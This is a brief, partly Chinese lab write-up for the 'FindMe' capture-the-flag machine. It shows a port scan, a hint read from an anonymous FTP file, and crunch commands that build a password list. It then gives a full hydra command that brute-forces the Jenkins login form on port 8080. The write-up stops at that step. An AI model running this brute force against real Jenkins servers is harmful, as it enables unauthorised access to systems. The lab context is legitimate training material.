# FindMe

2025.03.04 https://thehackerslabs.com/find-me/

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

ftp 可匿名，读取 ayuda.txt , 提示用户名 geralt ，jenkins 的密码包含 5 个字符，以 p 开头，以 a 结尾。

访问 80web 上无信息，8080 web 显示 jenkins，根据上面提示生成密码，进行爆破：

```
crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric -t p@@@a -o pass.txt

crunch 5 5 -t p@@@a -o pass.txt
hydra -t 64 -l admin -P pass.txt 192.168.5.40 -s 8080 -f http-post-form "/j_spring_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=:F=Invalid username or password"
```
